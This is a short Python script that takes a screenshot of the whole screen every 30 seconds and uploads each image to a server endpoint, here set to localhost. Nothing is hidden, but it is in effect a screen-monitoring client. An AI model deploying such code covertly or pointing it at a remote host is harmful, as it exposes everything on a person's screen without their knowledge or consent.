import pyscreenshot as pyscreen
import requests
import time
import io
from datetime import datetime

SERVER_URL = 'http://localhost:5000/upload_screenshot'

def capture_screenshot():
    try:
        # Capture the screen into memory
        screenshot = pyscreen.grab()
        
        # Convert the screenshot to an in-memory byte stream
        img_byte_stream = io.BytesIO()
        screenshot.save(img_byte_stream, format='PNG')
        img_byte_stream.seek(0)
        
        # Generate a timestamped filename for the screenshot
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        files = {'screenshot': (f'screenshot_{timestamp}.png', img_byte_stream, 'image/png')}
        
        # Send the screenshot to the server
        response = requests.post(SERVER_URL, files=files)
        if response.status_code == 200:
            print(f"Screenshot sent successfully at {timestamp}.")
        else:
            print(f"Failed to send screenshot. Status code: {response.status_code}")

    except Exception as e:
        print(f"Error capturing or uploading screenshot: {e}")

def periodic_screenshot_capture(interval=30):
    while True:
        try:
            capture_screenshot()
            time.sleep(interval)
        except Exception as e:
            print(f"Screenshot capturing error: {e}")
            time.sleep(interval)

if __name__ == "__main__":
    periodic_screenshot_capture(30)  # Capture screenshot every 30 seconds
